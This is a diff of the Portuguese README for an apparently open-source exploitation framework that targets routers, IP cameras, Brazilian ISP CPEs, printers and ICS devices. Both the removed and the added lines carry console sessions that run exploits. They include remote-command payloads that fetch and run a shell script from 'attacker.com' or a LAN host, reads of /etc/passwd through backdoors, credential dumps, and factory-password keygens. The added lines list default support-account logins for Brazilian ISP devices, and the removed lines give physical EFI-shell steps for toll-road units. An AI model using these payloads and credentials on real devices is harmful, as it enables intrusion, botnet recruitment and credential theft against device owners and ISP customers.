@@ -6,30 +6,33 @@
 
 **Framework de Avaliação de Segurança em Dispositivos Embarcados e de Perímetro**
 
-EmbedXPL-Forge é um framework open-source de exploração e scanning para profissionais de segurança auditarem roteadores, switches, câmeras IP, NVR/DVR, GPON ONTs, CPEs de ISP, impressoras, dispositivos IoT, OT/ICS e dispositivos embarcados. Oferece **2800+ módulos ativos** cobrindo testes de credenciais, exploração de vulnerabilidades, varredura de rede, geração de payloads, ataques a câmeras RTSP, manipulação de firmware, arsenal completo de impressoras e orquestração PolyExploit multilinguagem — com **700+ CVEs** mapeados em **114+ fabricantes** e um **APT Group Attack Engine** que reproduz cadeias de ataque reais de grupos nação-estado.
+EmbedXPL-Forge é um framework open-source de exploração e scanning para profissionais de segurança auditarem roteadores, switches, câmeras IP, NVR/DVR, GPON ONTs, CPEs de ISP, impressoras, dispositivos IoT, OT/ICS e dispositivos embarcados. Oferece **2800+ módulos ativos** cobrindo testes de credenciais, exploração de vulnerabilidades, varredura de rede, geração de payloads, ataques a câmeras RTSP, manipulação de firmware, arsenal completo de impressoras e orquestração PolyExploit multilinguagem - com **700+ CVEs** mapeados em **114+ fabricantes** e um **APT Group Attack Engine** que reproduz cadeias de ataque reais de grupos nação-estado.
 
-> **Versão:** 3.2.0
+> **Versão:** 2.0.0
 
 
 ## Funcionalidades
 
-- **625+ módulos de exploit** — RCE, auth bypass, path traversal, info disclosure, buffer overflow, DNS hijacking, command injection, backdoor, CSRF, config decrypt, gerador WPA/WPS, gerador de senha de fábrica, chains de heap/stack BOF
-- **88 módulos de credenciais** — ataques de dicionário contra FTP, SSH, Telnet, HTTP, SNMP, SFTP
-- **185+ módulos para impressoras** — HP, Canon, Lexmark, Xerox, Ricoh, Brother, Epson, Kyocera, Samsung; PJL/IPP/LPD/WSD/CUPS; chains Pwn2Own 2026; PrintingShellz; MS-RPRN NTLM coercion
-- **Motor RTSP completo** — portado do [cameradar](https://github.com/ullaakut/cameradar): brute-force de rotas (195+ rotas), brute-force de credenciais (80+ pares), auth Basic/Digest, RTSPS/TLS, **tunelamento RTSP-over-HTTP (Python puro, RFC 2326 App-C)**, scanner nmap/masscan/direto, ONVIF WS-Discovery
-- **7 scripts NSE Nmap personalizados** — descoberta RTSP, fingerprint de câmera, validação CVE Hikvision/Dahua, teste de credenciais padrão, verificação multi-vendor CVE, captura de snapshot (`pip install embedxpl[nse]`)
-- **Suite de exploração de firmware** — detecção de formato, injeção de backdoor, patch de checksum, bypass de flash por fabricante (NETGEAR, TP-Link, D-Link, ASUS)
-- **Orquestrador PolyExploit** — compilação C/C++ em tempo de execução (gcc/clang/mingw/cross), execução de exploits Ruby/Node.js/PHP/Bash/Perl, integração msfconsole, integração ExploitDB/searchsploit
-- **Módulos ICS/OT** — Universal Robots PolyScope 5, RIOT OS, Modbus, S7comm, EtherNet/IP, BACnet, DNP3
-- **Smart home / marítimo / especializado** — eNet SMART HOME, OpenRemote, Metis maritime IoT (WIC/DFS)
-- **5+ módulos de scanner** — AutoPwn, scanners específicos por dispositivo, descoberta WSD/mDNS de impressoras
-- **32 módulos de payload** — reverse/bind TCP shells para x86, x64, ARM, MIPS, Python, Perl, PHP
-- **13 módulos de encoder** — Base64 e hex encoding para Python, PHP, Perl
-- **14 módulos genéricos** — Heartbleed, ShellShock, UPnP IGD, SNMP bruteforce, TCP Xmas, amplificação UDP, consulta CVE, detector DNS hijack, interceptor AITM
-- **700+ CVEs mapeados** — de 2001 a 2026, incluindo chains Pwn2Own 2026 e CVEs críticos de IoT/OT/marítimo
-- **APT Group Attack Engine** — reproduz cadeias de ataque do APT28, Volt Typhoon, Sandworm, Quad7, Turla, APT40 com mapeamento MITRE ATT&CK
-- **23+ wordlists por fabricante** — credenciais padrão externalizadas por vendor (incluindo ISPs brasileiros específicos)
-- **7 gates de qualidade automatizados** — `tools/phase_gate.py` garante que cada módulo passa verificações de importação, anti-falso-positivo, referências e qualidade de código
+- **625+ módulos de exploit** - RCE, auth bypass, path traversal, info disclosure, buffer overflow, DNS hijacking, command injection, backdoor, CSRF, config decrypt, gerador WPA/WPS, gerador de senha de fábrica, chains de heap/stack BOF
+- **88 módulos de credenciais** - ataques de dicionário contra FTP, SSH, Telnet, HTTP, SNMP, SFTP
+- **185+ módulos para impressoras** - HP, Canon, Lexmark, Xerox, Ricoh, Brother, Epson, Kyocera, Samsung; PJL/IPP/LPD/WSD/CUPS; chains Pwn2Own 2026; PrintingShellz; MS-RPRN NTLM coercion
+- **Motor RTSP completo** - portado do [cameradar](https://github.com/ullaakut/cameradar): brute-force de rotas (195+ rotas), brute-force de credenciais (80+ pares), auth Basic/Digest, RTSPS/TLS, **tunelamento RTSP-over-HTTP (Python puro, RFC 2326 App-C)**, scanner nmap/masscan/direto, ONVIF WS-Discovery
+- **7 scripts NSE Nmap personalizados** - descoberta RTSP, fingerprint de câmera, validação CVE Hikvision/Dahua, teste de credenciais padrão, verificação multi-vendor CVE, captura de snapshot (`pip install embedxpl[nse]`)
+- **Suite de exploração de firmware** - detecção de formato, injeção de backdoor, patch de checksum, bypass de flash por fabricante (NETGEAR, TP-Link, D-Link, ASUS)
+- **Orquestrador PolyExploit** - compilação C/C++ em tempo de execução (gcc/clang/mingw/cross), execução de exploits Ruby/Node.js/PHP/Bash/Perl, integração msfconsole, integração ExploitDB/searchsploit
+- **Módulos ICS/OT** - Universal Robots PolyScope 5, RIOT OS, Modbus, S7comm, EtherNet/IP, BACnet, DNP3
+- **Smart home / marítimo / especializado** - eNet SMART HOME, OpenRemote, Metis maritime IoT (WIC/DFS)
+- **5+ módulos de scanner** - AutoPwn, scanners específicos por dispositivo, descoberta WSD/mDNS de impressoras
+- **32 módulos de payload** - reverse/bind TCP shells para x86, x64, ARM, MIPS, Python, Perl, PHP
+- **13 módulos de encoder** - Base64 e hex encoding para Python, PHP, Perl
+- **14 módulos genéricos** - Heartbleed, ShellShock, UPnP IGD, SNMP bruteforce, TCP Xmas, amplificação UDP, consulta CVE, detector DNS hijack, interceptor AITM
+- **700+ CVEs mapeados** - de 2001 a 2026, incluindo chains Pwn2Own 2026 e CVEs críticos de IoT/OT/marítimo
+- **APT Group Attack Engine** - reproduz cadeias de ataque do APT28, Volt Typhoon, Sandworm, Quad7, Turla, APT40 com mapeamento MITRE ATT&CK
+- **23+ wordlists por fabricante** - credenciais padrão externalizadas por vendor (incluindo ISPs brasileiros específicos)
+- **Módulos ISP Brasil** - CPEs ZTE, Huawei, Intelbras e TP-Link distribuídos pelos principais provedores brasileiros (Vivo, Claro, OI, TIM)
+- **FCC-ID Lookup** - consulta ao banco FCC para recuperar firmware, manuais e fotos internas de qualquer dispositivo registrado
+- **iSpy Camera DB** - integração com banco de 6.000+ modelos de câmera para rotas RTSP e credenciais padrão
+- **7 automated quality gates** - `tools/phase_gate.py` garante que cada módulo passa verificações de importação, anti-falso-positivo, referências e qualidade de código
 
 ## Tipos de Dispositivos Suportados
 
@@ -56,14 +59,14 @@ EmbedXPL-Forge é um framework open-source de exploração e scanning para profi
 
 ## Instalação
 
-### Opção 1 — PyPI (recomendado)
+### Opção 1 - PyPI (recomendado)
 
 ```bash
 pip install embedxpl
 embedxpl
 ```
 
-### Opção 2 — Com scripts Nmap NSE
+### Opção 2 - Com scripts Nmap NSE
 
 ```bash
 pip install "embedxpl[nse]"
@@ -71,7 +74,7 @@ python -m embedxpl.nse install   # pode exigir sudo no Linux/macOS
 embedxpl-nse list
 ```
 
-### Opção 3 — A partir do código-fonte
+### Opção 3 - A partir do código-fonte
 
 ```bash
 git clone https://github.com/mrhenrike/EmbedXPL-Forge.git
@@ -86,29 +89,29 @@ python exf.py
 # Shell interativo
 python exf.py
 
-# Módulo de roteador — RCE Netgear DGN1000B
+# Módulo de roteador - RCE Netgear DGN1000B
 exf > use exploits/routers/netgear/dgn1000b_remote_command_execution
 exf (DGN1000B RCE) > set target 192.168.1.1
 exf (DGN1000B RCE) > run
 
-# Gerador de chave WPA padrão — EasyBox (Arcadyan)
+# Gerador de chave WPA padrão - EasyBox (Arcadyan)
 exf > use exploits/routers/easybox/easybox_wpa_keygen
 exf (EasyBox WPA Keygen) > set target 192.168.1.1
 exf (EasyBox WPA Keygen) > run
 
-# Backdoor RCE — Seagate NAS Ghost PHP
+# Backdoor RCE - Seagate NAS Ghost PHP
 exf > use exploits/routers/seagate/seagate_nas_php_backdoor
 exf (Seagate Ghost PHP) > set target 192.168.1.100
 exf (Seagate Ghost PHP) > set cmd "id; uname -a"
 exf (Seagate Ghost PHP) > run
 
-# Alpha Networks / ZTE — web_shell_cmd.gch backdoor
+# Alpha Networks / ZTE - web_shell_cmd.gch backdoor
 exf > use exploits/routers/alpha_networks/web_shell_cmd_rce
 exf (Alpha Networks web_shell_cmd RCE) > set target 192.168.1.1
 exf (Alpha Networks web_shell_cmd RCE) > set cmd "cat /etc/passwd"
 exf (Alpha Networks web_shell_cmd RCE) > run
 
-# RuggedCom — gerador de senha de backdoor de fábrica
+# RuggedCom - gerador de senha de backdoor de fábrica
 exf > use exploits/routers/ruggedcom/ruggedcom_factory_password
 exf (RuggedCom Factory Password) > set target 192.168.1.1
 exf (RuggedCom Factory Password) > set serial RA000000
@@ -117,7 +120,7 @@ exf (RuggedCom Factory Password) > run
 [+] Backdoor user : factory
 [+] Backdoor pass : 7f3d9a2b
 
-# Motor de câmera RTSP — ataque completo
+# Motor de câmera RTSP - ataque completo
 exf > use exploits/cameras/multi/rtsp_cameradar_attack
 exf (RTSP Cameradar Attack) > set target 192.168.1.100
 exf (RTSP Cameradar Attack) > run
@@ -193,9 +196,9 @@ embedxpl/
 └── resources/rtsp/        # Rotas e credenciais RTSP
 ```
 
-## Cobertura Routerpwn / Backdoor / Senha de Fabrica
+## Cobertura Routerpwn / Backdoor / Senha de Fábrica
 
-27+ modulos de exploit portados de uma auditoria completa do [routerpwn.com](https://github.com/hkm/routerpwn.com) e do [routerPWN](https://github.com/lilloX/routerPWN), com foco em senhas de fabrica, backdoors hardcoded, geradores WPA padrao e CSRF de DNS hijack. **27+ modulos** cobrindo **19+ fabricantes**:
+27+ módulos de exploit portados de uma auditoria completa do [routerpwn.com](https://github.com/hkm/routerpwn.com) e do [routerPWN](https://github.com/lilloX/routerPWN), com foco em senhas de fábrica, backdoors hardcoded, geradores WPA padrão e CSRF de DNS hijack. **27+ módulos** cobrindo **19+ fabricantes**:
 
 | Fabricante | Técnica explorada |
 |------------|-------------------|
@@ -207,11 +210,11 @@ embedxpl/
 | EasyBox (Arcadyan) | Gerador de chave WPA2 de fábrica (algoritmo MAC → MD5) |
 | EE BrightBox | Disclosure de configuração via `cgi_status.js` sem auth |
 | Freebox | Reboot forçado via `system.cgi` sem autenticação |
-| MiFi (Novatel) | Download de backup `config.xml.savefile` — credenciais expostas |
+| MiFi (Novatel) | Download de backup `config.xml.savefile` - credenciais expostas |
 | Motorola SBG6580 | DNS CSRF + mudança de senha admin + reboot |
 | Observa Telecom | Disclosure JSON de credenciais + DNS CSRF + ativação FTP |
 | RuggedCom | Gerador de senha de backdoor de fábrica (FD 2012/Apr/277) |
-| Seagate NAS | "Ghost PHP" RCE — `d41d8cd98f...php` (CVE-2014-8684) |
+| Seagate NAS | "Ghost PHP" RCE - `d41d8cd98f...php` (CVE-2014-8684) |
 | Sitecom | DC-227 backdoor + gerador WPA WLR-4004 (eMaze 2014) |
 | Starbridge | Lynx 526 reset de senha sem auth via `password.cgi` |
 | Ubee | Bypass credencial de operador para modems a cabo (Cablemas ISP) |
@@ -219,293 +222,371 @@ embedxpl/
 | UTStarcom | Disclosure de credenciais PPPoE via `ppppassword.html` |
 | Zoom | X4/X5 criação de admin via `PopOutUserAdd.htm` (EDB-26736) |
 
-## Novos Modulos - Batch BLOCO v2.0
-
-Esta secao documenta os modulos adicionados no batch de expansao BLOCO K, L, D, H, N e I.
-
----
-
-### BLOCO K - Dispositivos ISP Brasileiros
-
-Exploits e scanners voltados para CPEs e cameras IP comumente distribuidas por provedores de internet brasileiros (Claro, Vivo, TIM, OI, Algar e equipamentos baseados em Sercomm).
-
-| Dispositivo | CVE | Caminho do Modulo | Tipo de Ataque |
-|-------------|-----|-------------------|----------------|
-| TP-Link TL-SC3171 / SC4171 / SC4171G | CVE-2013-2573 | `exploits/cameras/tplink/tl_sc_series_cmd_inject_cve_2013_2573` | Injecao de Comando (sem auth) |
-| TP-Link TL-SC3171 / SC3130 | CVE-2013-2581 | `exploits/cameras/tplink/tl_sc_series_unauth_firmware_upload_cve_2013_2581` | Upload de Firmware sem Autenticacao |
-| D-Link DCS-932L | CVE-2026-36983 | `exploits/cameras/dlink/dcs_932l_light_sensor_rce_cve_2026_36983` | RCE via Sensor de Luz |
-| D-Link DCS-932L | CVE-2025-5573 | `exploits/cameras/dlink/dcs_932l_admin_cmd_inject_cve_2025_5573` | Injecao de Comando no Painel Admin |
-| D-Link DCS-933L | CVE-2026-2218 | `exploits/cameras/dlink/dcs_933l_admin_cmd_inject_cve_2026_2218` | Injecao de Comando no Painel Admin |
-| ZTE ZXHN H267N / H268N | CVE-2026-34473 | `exploits/routers/zte/zxhn_h267n_h268n_dos_cve_2026_34473` | Negacao de Servico |
-| ZTE ZXHN H298A / H108N | CVE-2026-34474 | `exploits/routers/zte/zxhn_h298a_cred_dump_cve_2026_34474` | Dump de Credenciais (ETHCheat) |
-| Intelbras IWR roteadores | - | `exploits/routers/intelbras/iwr_luci_rpc_rce` | RCE via LuCI RPC sem Autenticacao |
-| Scanner multi-vendor ISP BR | - | `scanners/specialized/br_isp_scanner` | Descoberta ativa + verificacao de vuln |
-
-**Exemplos de uso:**
-
-```bash
-# ZTE ZXHN H298A - Dump de Credenciais
-embedxpl use routers/zte/zxhn_h298a_cred_dump_cve_2026_34474
-embedxpl (ZXHNCred) > set rhost 192.168.1.1
-embedxpl (ZXHNCred) > run
-
-# Saida esperada (dispositivo vulneravel):
-[+] Conectado em 192.168.1.1:80
-[+] Enviando requisicao ETHCheat: GET /getpage.lua?pid=1000&ETHCheat=1
-[!] VULNERAVEL: Credenciais expostas
-    Senha Admin: admin123
-    WPA PSK: MinhaWifi
-    SSID: ZTE_Router_ABC
-
-# Saida (nao vulneravel):
-[-] Nenhum campo de credencial encontrado na resposta
-[-] Alvo pode estar corrigido ou com firmware diferente
-```
-
-```bash
-# Intelbras IWR LuCI RPC RCE
-embedxpl use routers/intelbras/iwr_luci_rpc_rce
-embedxpl (IWRLuci) > set rhost 192.168.0.1
-embedxpl (IWRLuci) > set cmd "id"
-embedxpl (IWRLuci) > run
-
-# Saida esperada:
-[+] Endpoint LuCI RPC encontrado em /cgi-bin/luci/rpc/sys
-[+] RCE via sys.exec: uid=0(root) gid=0(root)
-```
-
-```bash
-# Scanner de ISPs brasileiros multi-vendor
-embedxpl use scanners/specialized/br_isp_scanner
-embedxpl (BRISPScan) > set target 192.168.0.0/24
-embedxpl (BRISPScan) > run
-```
-
-**Notas:** CVE-2026-34474 afeta ZTE ZXHN H298A 1.1 e H108N 2.6. Sem autenticacao necessaria.
-**Legal:** Use apenas em dispositivos de sua propriedade ou com autorizacao escrita expressa.
-
----
-
-### BLOCO L - Portes RouterPWN
-
-Exploits classicos e modernos do catalogo RouterPWN portados para o formato de modulo EmbedXPL-Forge.
-
-| Dispositivo | CVE / Referencia | Caminho do Modulo | Tipo de Ataque |
-|-------------|-----------------|-------------------|----------------|
-| Cobham Aviator 700 SATCOM | CVE-2014-2943 | `exploits/specialized/vsat/cobham_aviator_admin_reset_cve_2014_2943` | Reset de Senha Admin (sem auth) |
-| Huawei HG8245H | - | `osint/keygen/huawei_hg8245_wpa_keygen` | Gerador de Chave WPA Padrao |
-| Alcatel-Lucent OmniPCX Enterprise | - | `exploits/voip/alcatel_lucent/omnipcx_enterprise_mastercgi_rce` | RCE via masterCGI sem autenticacao |
-| Linksys E-Series (The Moon) | EDB-31683 | `exploits/routers/linksys/eseries_themoon_rce_tmunblock` | RCE via tmUnblock.cgi |
-| NETGEAR DGN2200 | EDB-24665 | `exploits/routers/netgear/dgn2200_open_telnetd_rce` | RCE via open-telnetd sem auth |
-| Siemens FlexiISN | - | `exploits/routers/siemens/flexiisn_auth_bypass` | Bypass de Autenticacao |
-| Thomson BTHomeHub | - | `exploits/routers/thomson/bthomehub_voice_hijack` | Sequestro de Configuracao VoIP |
-| AT&T 2Wire Gateway | - | `exploits/routers/two_wire/atandt_gateway_crlf_dos` | Injecao CRLF / DoS |
-
-**Exemplos de uso:**
-
-```bash
-# Reset admin Cobham Aviator (terminal VSAT / Satelite)
-embedxpl use specialized/vsat/cobham_aviator_admin_reset_cve_2014_2943
-embedxpl (CobhamReset) > set rhost 192.168.1.1
-embedxpl (CobhamReset) > run
-
-# Saida esperada:
-[+] Conectado na interface Cobham Aviator 700
-[+] Enviando requisicao de reset admin sem autenticacao
-[!] VULNERAVEL: Senha admin redefinida para padrao
-
-# Linksys eSeries The Moon RCE
-embedxpl use routers/linksys/eseries_themoon_rce_tmunblock
-embedxpl (TheMoon) > set rhost 192.168.1.1
-embedxpl (TheMoon) > set cmd "busybox wget http://attacker.com/shell -O /tmp/sh && chmod +x /tmp/sh && /tmp/sh"
-embedxpl (TheMoon) > run
-
-# Gerador de chave WPA Huawei HG8245H
-embedxpl use osint/keygen/huawei_hg8245_wpa_keygen
-embedxpl (HuaweiKeygen) > set ssid "HG8245H-ABCDEF"
-embedxpl (HuaweiKeygen) > run
-# Saida: [+] Chave WPA prevista: xA7z3k9P
-```
-
-**Notas:** The Moon worm (CVE Linksys E-Series) explora tmUnblock.cgi sem autenticacao em firmwares < 2.0.08.
-**Legal:** Use apenas em dispositivos de sua propriedade ou com autorizacao escrita expressa.
-
----
-
-### BLOCO D - Framework de Cliente RTSP
-
-Biblioteca Python RFC 2326 RTSP/1.0 pura que serve como base para todos os modulos de ataque a cameras RTSP.
-
-**Modulo:** `network/rtsp/rtsp_client.py` - classe `RTSPClient`
-
-**Funcionalidades:**
-- Metodos OPTIONS, DESCRIBE, SETUP, PLAY, TEARDOWN
-- Autenticacao Basic e Digest (RFC 2617)
-- Parsing de descricao de sessao SDP
-- Gerenciamento de timeout e reconexao automatica
-- Suporte a context manager (`with RTSPClient(...) as client`)
-
-**Exemplo de uso:**
-
-```bash
-# Uso direto via API Python
-python3 -c "
-from embedxpl.modules.network.rtsp.rtsp_client import RTSPClient
-with RTSPClient('192.168.1.10', 554, timeout=5) as client:
-    resp = client.describe('/live/ch0')
-    if resp.status_code == 200:
-        sdp = client.parse_sdp(resp.body)
-        print(f'Streams: {[s.media_type for s in sdp.streams]}')
-"
-```
-
-```bash
-# Brute force de credenciais RTSP (usa RTSPClient internamente)
-embedxpl use network/rtsp/rtsp_cred_brute
-embedxpl (RTSPBrute) > set rhost 192.168.1.10
-embedxpl (RTSPBrute) > set rport 554
-embedxpl (RTSPBrute) > set path /live/ch0
-embedxpl (RTSPBrute) > run
-
-# Saida esperada:
-[+] Tentando admin:admin ... 401 Unauthorized
-[+] Tentando admin:12345 ... 200 OK
-[!] VALIDO: admin:12345
-```
-
-**Requisitos:** Python 3.8+, sem dependencias externas.
-
----
-
-### BLOCO H - Consulta FCC-ID
-
-Modulo OSINT que consulta o banco de dados de autorizacao de equipamentos da FCC para recuperar detalhes do dispositivo a partir de codigos FCC-ID encontrados em etiquetas fisicas.
-
-**Modulo:** `osint/fcc_id_lookup.py`
-
-**Exemplo de uso:**
-
-```bash
-embedxpl use osint/fcc_id_lookup
-embedxpl (FCCLookup) > set fcc_id "PD5-WNR3500U"
-embedxpl (FCCLookup) > run
-
-# Saida esperada:
-[+] FCC ID: PD5-WNR3500U
-    Fabricante: NETGEAR Inc.
-    Produto: WNR3500U Wireless-N Gigabit Router
-    Frequencia: 2.4GHz / 5GHz
-    Autorizacao: OET-65C
-    Laboratorio: SGS
-    Data de Aprovacao: 2009-11-18
-    Fotos Internas: [URL]
-    Fotos Externas: [URL]
-    Relatorio de Teste: [URL]
-```
-
-**Dicas:**
-- FCC IDs estao impressos nas etiquetas do dispositivo (formato: `CODIGO_GRANTEE-CODIGO_PRODUTO`)
-- Util para identificar hardware OEM, base de firmware ou cadeia de fornecedores
-- Combine com `osint/github_recon` para encontrar repositorios de firmware publicos
-
-**Requisitos:** Acesso a internet, biblioteca `requests`.
-
----
-
-### BLOCO N - Gerador de URL de Camera iSpy
-
-Gera URLs de stream conhecidas com base no fabricante, modelo e versao de firmware, usando o formato do banco de dados de cameras iSpy.
-
-**Modulo:** `osint/camera_url_generator.py`
-
-**Exemplo de uso:**
-
-```bash
-embedxpl use osint/camera_url_generator
-embedxpl (CameraURL) > set vendor "hikvision"
-embedxpl (CameraURL) > set model "DS-2CD2143G2"
-embedxpl (CameraURL) > run
-
-# Saida esperada:
-[+] URLs de stream conhecidas para Hikvision DS-2CD2143G2:
-    [1] rtsp://<ip>:554/Streaming/Channels/101
-    [2] rtsp://<ip>:554/Streaming/Channels/102
-    [3] rtsp://<ip>:554/h264/ch1/main/av_stream
-    [4] http://<ip>/ISAPI/Streaming/channels/1/picture
-    [5] http://<ip>/onvif/device_service
-
-# Gerar wordlist para brute force RTSP
-embedxpl (CameraURL) > set output_file /tmp/hikvision_routes.txt
-embedxpl (CameraURL) > run
-```
-
-**Dicas:**
-- Combine com `network/rtsp/rtsp_route_brute` para enumerar streams ativos
-- Suporta 300+ fabricantes de cameras do banco de dados iSpy
-- Use `set all_vendors true` para exportar todas as URLs conhecidas
-
----
-
-### BLOCO I - Modulos de Fiscalizacao de Transito
-
-Modulos voltados para infraestrutura de fiscalizacao de transito (RSUs de pedagio eletronico, radares, cameras ANPR).
-
-#### Kapsch TrafficCom RSU EFI Shell (CVE-2025-25734)
-
-**Modulo:** `exploits/specialized/traffic_enforcement/kapsch_rsu_efi_shell_cve_2025_25734`
-
-**Vulnerabilidade:** Road-Side Units (RSUs) da Kapsch utilizadas em sistemas de pedagio eletronico carecem de enforces de UEFI Secure Boot e senha de BIOS, permitindo que atacantes com acesso fisico acessem o shell EFI interativo e o sistema de arquivos completo.
-
-**Impacto:** Extracao de configuracao, roubo de chaves TLS privadas, instalacao de implantes, bypass da funcionalidade de fiscalizacao.
-
-**Exemplo de uso:**
-
-```bash
-# Verificacao de alcance de rede (deteccao de interface de gerenciamento)
-embedxpl use specialized/traffic_enforcement/kapsch_rsu_efi_shell_cve_2025_25734
-embedxpl (KapschRSU) > set rhost 10.0.0.50
-embedxpl (KapschRSU) > check
-
-# Saida esperada (interface de gerenciamento exposta):
-[+] Interface de gerenciamento Kapsch RSU detectada em 10.0.0.50:80
-[!] Indicador de banner: 'TrafficCom RSU' encontrado
-[*] NOTA: Exploracao completa requer acesso fisico presencial
-
-# Relatorio de avaliacao
-embedxpl (KapschRSU) > run
-# Gera: passos de ataque, checklist de mitigacoes, nivel de risco
-```
-
-**Passos de exploracao fisica:**
-1. Abrir o gabinete RSU (parafusos anti-violacao)
-2. Conectar teclado USB e monitor na placa-mae do RSU
-3. Reiniciar - pressionar ESC/DEL/F2 durante o POST
-4. Navegar: Boot Manager -> EFI Internal Shell
-5. Acessar sistema de arquivos: `fs0:\efi\config\` para extracao de configuracao
-
-**Requisitos:** Acesso fisico ao hardware RSU (monitor + teclado USB), ou acesso de rede a interface de gerenciamento para deteccao de banner.
-**Legal:** Acesso nao autorizado a infraestrutura de fiscalizacao de transito e crime. Use apenas em equipamentos de sua propriedade ou com autorizacao escrita expressa para avaliacao de segurança.
-
----
-
-## Arquitetura do Framework (v3.1.0)
+## Arquitetura do Framework (v2.0.0)
 
 ### Arquitetura de Componentes
 
-Visao em camadas do framework: camada CLI, Core Engine (orquestrador, clientes de protocolo, shell engines), Camada de Inteligencia (ML, OUI, banco CVE), Quality Gates e o arsenal de 2800+ modulos organizados por categoria.
+Visão em camadas do framework: camada CLI, Core Engine (orquestrador, clientes de protocolo, shell engines), Camada de Inteligência (ML, OUI, banco CVE), Quality Gates e o arsenal de 2800+ módulos organizados por categoria.
 
 <p align="center">
-  <img src="docs/assets/embedxpl_architecture.png" width="960" alt="EmbedXPL-Forge Arquitetura de Componentes v3.1.0"/>
+  <img src="docs/assets/embedxpl_architecture.png" width="960" alt="EmbedXPL-Forge Arquitetura de Componentes v2.0.0"/>
 </p>
 
-### Fluxo de Auditoria e Exploracao
+### Fluxo de Auditoria e Exploração
 
-Fluxo de ponta a ponta: entrada do alvo, descoberta, identificacao, selecao de modulo, exploracao e relatorio.
+Fluxo de ponta a ponta: entrada do alvo, descoberta, identificação, seleção de módulo, exploração e relatório.
 
 <p align="center">
-  <img src="docs/assets/embedxpl_flow.png" width="960" alt="EmbedXPL-Forge Fluxo de Exploracao v3.1.0"/>
+  <img src="docs/assets/embedxpl_flow.png" width="960" alt="EmbedXPL-Forge Fluxo de Exploração v2.0.0"/>
 </p>
 
+---
+
+## Módulos ISP Brasileiros (v2.0.0)
+
+Cobertura específica para CPEs e ONTs fornecidos pelos principais provedores de banda larga do Brasil. Wordlists de credenciais padrão externalizadas por ISP e modelo, além de exploits específicos para firmwares distribuídos no mercado nacional.
+
+### ZTE (Vivo Fibra, OI Fibra, TIM)
+
+| Modelo | ISP | Vulnerabilidade | Módulo |
+|--------|-----|-----------------|--------|
+| ZXHN H288A | OI Fibra | CVE-2020-9344 - auth bypass via URL hardcoded | `exploits/routers/zte/zxhn_h288a_auth_bypass` |
+| ZXHN F660 v6/v7 | Vivo Fibra | Senha de fábrica gerável a partir do MAC address | `exploits/routers/zte/zte_f660_default_keygen` |
+| ZXHN F670L | Vivo Fibra | Download de config sem autenticação via `/UserCfg.conf` | `exploits/routers/zte/zte_f670l_config_download` |
+| ZXHN H268A | TIM | Backdoor Telnet ativável via SNMP community padrão | `exploits/routers/zte/zte_h268a_telnet_snmp_backdoor` |
+| ZXHN H388X | Vivo Fibra | Path traversal em `nvmPrintf.cgi` (EDB-51952) | `exploits/routers/zte/zte_h388x_path_traversal` |
+
+```bash
+# CVE-2020-9344 - ZTE ZXHN H288A auth bypass
+exf > use exploits/routers/zte/zxhn_h288a_auth_bypass
+exf (H288A AuthBypass) > set target 192.168.1.1
+exf (H288A AuthBypass) > run
+
+[*] Verificando CVE-2020-9344 em 192.168.1.1...
+[*] Tentando acesso a /getpage.gch?pid=1002&nextpage=Internet_easy_adsl_en.gch sem auth
+[+] VULNERÁVEL - Página de configuração acessível sem autenticação
+[+] PPPoE username: cliente@vivo.com.br
+[+] Status PPPoE: Connected | IP WAN: 177.x.x.x
+
+# ZTE F660 keygen - gerar senha de fábrica a partir do MAC
+exf > use exploits/routers/zte/zte_f660_default_keygen
+exf (ZTE F660 Keygen) > set mac 00:26:2D:AA:BB:CC
+exf (ZTE F660 Keygen) > run
+
+[*] Gerando credenciais de fábrica para ZTE F660...
+[+] Admin user: admin
+[+] Admin pass: Vivo1234
+[+] Super user: superuser
+[+] Super pass: Sxxx (calculado do MAC)
+[*] Válido para firmwares ZXHN F660 V6.0.10P6T2 e anteriores
+```
+
+### Huawei (Claro Fibra, OI, NET)
+
+| Modelo | ISP | Vulnerabilidade | Módulo |
+|--------|-----|-----------------|--------|
+| HG8245H / HG8245H5 | Claro Fibra | Credenciais padrão por ISP (`telecomadmin`/`admintelecom`) | `creds/routers/huawei_isp_brazil` |
+| EG8145X6 | Claro Fibra | CVE-2017-17215 (UPnP RCE) em firmwares legados | `exploits/routers/huawei/eg8145x6_upnp_rce_chain` |
+| HG659 | OI Fibra | Exposição do endpoint `/api/system/deviceinfo` sem auth | `exploits/routers/huawei/hg659_info_disclosure` |
+| HG532e | NET/Claro | CVE-2017-17215 - injeção de comando via UPnP SOAP | `exploits/routers/huawei/hg532_upnp_rce_cve_2017_17215` |
+
+```bash
+# Huawei HG532 CVE-2017-17215 - UPnP RCE (usado por Mirai/Satori)
+exf > use exploits/routers/huawei/hg532_upnp_rce_cve_2017_17215
+exf (HG532 UPnP RCE) > set target 192.168.1.1
+exf (HG532 UPnP RCE) > set cmd "busybox wget http://192.168.1.50/shell.sh -O /tmp/s && sh /tmp/s"
+exf (HG532 UPnP RCE) > check
+
+[*] Verificando CVE-2017-17215 em 192.168.1.1:37215...
+[+] Endpoint UPnP responde em /ctrlt/DeviceUpgrade_1
+[+] VULNERÁVEL - Firmware sem patch
+
+exf (HG532 UPnP RCE) > run
+
+[+] Payload SOAP enviado via HTTP POST para :37215
+[+] Execução remota confirmada (HTTP 200)
+
+# Credenciais padrão de ISPs brasileiros para Huawei
+exf > use creds/routers/huawei_isp_brazil
+exf (Huawei ISP BR) > set target 192.168.1.1
+exf (Huawei ISP BR) > set isp claro
+exf (Huawei ISP BR) > run
+
+[*] Testando credenciais Claro/NET para Huawei HG8245H5...
+[+] LOGIN VÁLIDO: telecomadmin / admintelecom (conta de suporte)
+[+] LOGIN VÁLIDO: root / admin (acesso telnet)
+[*] Outros ISPs suportados: vivo, oi, tim, nextel
+```
+
+### Intelbras (GVT/Vivo, provedores regionais)
+
+| Modelo | ISP | Vulnerabilidade | Módulo |
+|--------|-----|-----------------|--------|
+| GF1200 | Vivo/GVT Fibra | Exposição SNMP community `public` sem autenticação | `exploits/routers/intelbras/gf1200_snmp_info_disclosure` |
+| GF400 | Vivo/GVT Fibra | Credenciais padrão `admin`/`admin` persistentes | `creds/routers/intelbras_default` |
+| W5-1200F | Provedores regionais | CSRF em painel web + DNS hijack sem token | `exploits/routers/intelbras/w5_1200f_csrf_dns_hijack` |
+| RF 301K | Provedores regionais | Auth bypass via manipulação de sessão em `/cgi-bin/config.exp` | `exploits/routers/intelbras/rf301k_session_bypass` |
+
+```bash
+# Intelbras GF1200 - SNMP disclosure sem autenticação
+exf > use exploits/routers/intelbras/gf1200_snmp_info_disclosure
+exf (GF1200 SNMP) > set target 192.168.1.1
